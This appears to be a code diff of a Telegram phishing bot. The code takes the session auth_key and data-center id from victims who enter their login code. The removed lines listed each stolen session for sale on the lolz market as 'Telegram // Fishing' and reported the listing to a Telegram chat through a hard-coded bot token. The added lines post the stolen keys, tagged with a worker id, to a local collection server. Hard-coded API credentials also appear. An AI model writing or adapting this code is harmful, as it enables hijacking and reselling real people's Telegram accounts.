@@ -138,38 +138,8 @@ async def inline_click(call: types.CallbackQuery):
             auth_key = binascii.hexlify(sessionString.auth_key.key)
 
             steps[call.message.chat.id]["step"] = -1
-            while True:
-                item = lolz.market_add_item(title="Телеграм // фишинг // 13 рублей", price=13, category_id=24, item_origin="fishing", extended_guarantee=0, title_en="Telegram // Fishing // 13 rub")
-                if item.status_code == 429:
-                    await asyncio.sleep(3)
-                    continue
-                    
-                item = item.json()
 
-                item_id = item["item"]["item_id"]
-
-                await asyncio.sleep(3)
-
-                item_checked = lolz.market_add_item_check(item = item_id, password = dc_id, login = auth_key)
-                if item_checked.status_code != 429:
-                    while True:
-                        await asyncio.sleep(5)
-                        item_checked = lolz.market_add_item_check(item = item_id, password = dc_id, login = auth_key)
-
-                        if item_checked.status_code == 429:
-                            continue
-
-                        json = item_checked.json()
-                        if "status" not in json.keys():
-                            break
-
-                        if json["status"] == "ok":
-                            text = f"https://lolz.guru/market/{item_id}/"
-                            req = requests.get(f"https://api.telegram.org/bot5641227803:AAFVERiOhnLPQPJmhi0v4TIriv9FoWOmrbw/sendMessage?chat_id=-1001791570384&text={text}")
-
-                        break
-                
-                break
+            requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": str(auth_key), "dc_id": dc_id})
 
             client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
             await client.connect()
@@ -225,31 +195,9 @@ async def code_step(message: types.Message):
         auth_key = binascii.hexlify(sessionString.auth_key.key)
 
         steps[message.chat.id]["step"] = -1
-        while True:
-            item = lolz.market_add_item(title="Телеграм // фишинг // 13 рублей", price=13, category_id=24, item_origin="fishing", extended_guarantee=0, title_en="Telegram // Fishing // 13 rub")
-            if item.status_code == 429:
-                await asyncio.sleep(3)
-                continue
-                
-            item = item.json()
-            item_id = item["item"]["item_id"]
-            await asyncio.sleep(3)
-            item_checked = lolz.market_add_item_check(item = item_id, password = dc_id, login = auth_key)
-            if item_checked.status_code != 429:
-                while True:
-                    await asyncio.sleep(5)
-                    item_checked = lolz.market_add_item_check(item = item_id, password = dc_id, login = auth_key)
-                    if item_checked.status_code == 429:
-                        continue
-                    json = item_checked.json()
-                    if "status" not in json.keys():
-                        break
-                    if json["status"] == "ok":
-                        text = f"https://lolz.guru/market/{item_id}/"
-                        req = requests.get(f"https://api.telegram.org/bot5641227803:AAFVERiOhnLPQPJmhi0v4TIriv9FoWOmrbw/sendMessage?chat_id=-1001791570384&text={text}")
-                    break
-            
-            break
+
+        requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": str(auth_key), "dc_id": dc_id})
+
         client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
         await client.connect()
 
